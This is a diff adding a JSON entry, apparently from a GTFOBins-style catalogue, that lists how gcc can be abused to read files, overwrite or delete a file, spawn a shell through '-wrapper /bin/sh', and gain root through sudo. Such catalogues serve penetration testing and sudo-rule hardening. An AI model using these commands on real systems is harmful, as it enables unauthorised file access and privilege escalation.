@@ -1,0 +1,28 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        "code": "LFILE=file_to_read\ngcc -x c -E \"$LFILE\"\n"
+      },
+      {
+        "description": "The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data.",
+        "code": "LFILE=file_to_read\ngcc @\"$LFILE\"\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE\n"
+      }
+    ],
+    "shell": [
+      {
+        "code": "gcc -wrapper /bin/sh,-s ."
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo gcc -wrapper /bin/sh,-s ."
+      }
+    ]
+  }
+}
